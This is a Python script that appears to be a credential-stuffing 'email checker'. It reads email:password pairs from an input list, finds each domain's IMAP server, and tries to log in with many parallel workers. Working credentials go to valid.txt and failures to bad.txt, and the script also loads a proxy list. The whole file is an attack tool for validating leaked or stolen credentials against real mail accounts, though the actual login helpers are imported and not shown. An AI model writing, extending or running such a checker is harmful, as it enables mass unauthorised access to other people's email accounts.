from utils.config import load_config
from utils.imap_utils import get_imap_server, validate_email
from multiprocessing import Pool, Manager
import time

def load_processed_emails(valid_file="data/valid.txt", bad_file="data/bad.txt"):
    """Loads processed email:password combinations from valid.txt and bad.txt."""
    processed_emails = set()
    for filename in [valid_file, bad_file]:
        try:
            with open(filename, "r") as f:
                for line in f:
                    email, password = line.strip().split(":")
                    processed_emails.add(f"{email}:{password}")
        except FileNotFoundError:
            pass  # Ignore if files don't exist
    return processed_emails

def load_proxy(proxy="data/proxy.txt"):
    proxy_list = []
    with open(proxy, "r") as f:
        for line in f:
            proxy_list.append(line)
    return proxy_list

def load_email_list(input_file="data/input.txt"):
    """Loads email:password combinations from the input file."""
    email_list = []
    with open(input_file, "r") as f:
        for line in f:
            parts = line.strip().split(":")
            email = parts[0]
            password = parts[1] 
            email_list.append((email, password))
    return email_list

def write_to_file(email, password, filename):
    """Writes an email address and password to the specified file."""
    with open(filename, "a") as f:
        f.write(f"{email}:{password}\n")

def process_email(email_data, config, processed_emails):
    """Processes a single email, including IMAP server lookup and validation."""
    email, password = email_data
    if f"{email}:{password}" in processed_emails:
        print(f"Skipping duplicate: {email}:{password}")
        return

    imap_server = get_imap_server(email, config)

    if imap_server:
        is_valid = validate_email(email, password, imap_server, config)
        if is_valid:
            print(f"Email {email} is VALID!")
            write_to_file(email, password, "data/valid.txt")
        else:
            print(f"Email {email} is INVALID!")
            write_to_file(email, password, "data/bad.txt")
    else:
        print(f"Could not find IMAP server for {email}")
        write_to_file(email, password, "data/imapissue.txt")

if __name__ == "__main__":
    start_time = time.time()
    config = load_config()
    email_list = load_email_list()
    processed_emails = load_processed_emails()
    load_proxy()

    with Manager() as manager:
        # Create a shared list from the processed emails
        shared_processed_list = manager.list(list(processed_emails)) 
        # Convert the shared list to a set
        shared_processed_emails = set(shared_processed_list)

        with Pool(processes=config["threads"]) as pool:
            pool.starmap(process_email, [(email_data, config, shared_processed_emails) for email_data in email_list])

    end_time = time.time()
    print(f"Email checking completed in {end_time - start_time:.2f} seconds!")